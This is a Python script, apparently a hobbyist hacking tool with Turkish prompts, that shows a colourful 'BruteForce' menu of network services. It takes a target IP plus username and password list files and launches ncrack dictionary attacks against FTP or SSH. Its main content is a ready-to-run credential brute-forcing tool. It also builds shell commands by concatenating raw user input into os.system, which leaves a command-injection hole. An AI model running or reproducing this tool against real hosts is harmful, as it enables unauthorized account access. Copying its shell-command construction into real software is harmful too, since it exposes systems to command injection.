#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import time
from os import system

system("cls||clear")
def rainbow_text(text, delay=0.1):
    colors = [
    "\033[31m", "\033[33m", "\033[32m", "\033[36m", "\033[34m", "\033[35m", "\033[37m",
    ]

    for i in range(len(text)):
        char = text[i]
        color = colors[i % len(colors)]
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)

    sys.stdout.write("\033[0m")
    sys.stdout.write("\n")

def main():
    rainbow_text("Coding by omicr0n")
    sys.stdout.write("\033[37m")
    sys.stdout.write("Coding by Omicron\n")
	
if __name__ == "__main__":
    rainbow_text("Coding by omicr0n")
    
rainbow_text1 = ("\033[31mc\033[91mo\033[93md\033[92mi\033[34mn\033[95mg \033[35mb\033[31my \033[91mo\033[93mm\033[92mi\033[34mc\033[95mr\033[35m0\033[31mn")


os.system("apt-get install figlet")
os.system("clear")
os.system("figlet BruteForce")
print(f"""
\033[35mBruteForce Programına Hoş Geldiniz. \033[94m//\033[0m {rainbow_text1}

\033[94m1) FTP       
\033[32m2) SSH
\033[31m3) Telnet
\033[94m4) HTTP
\033[32m5) SMB
\033[31m6) RDP
\033[94m7) VNC
\033[32m8) SIP
\033[31m9) Redis
\033[94m10) PostgreSQL
\033[32m11)MySQL \033[0m
""")

islemno = input("\033[94mİşlem No Girin: \033[0m")
hedefip = input("\033[31mHedef İp Girin: \033[0m")
kullaniciadi = input("\033[32mKullanıcı Adı Dosya Yolu: \033[0m")
sifre = input("\033[32mSifrelerin Bulunduğu Dosya Yolu: \033[0m")

if(islemno == "1"):
	os.system("ncrack -p 21 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

if(islemno == "2"):
	os.system("ncrack -p 22 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)
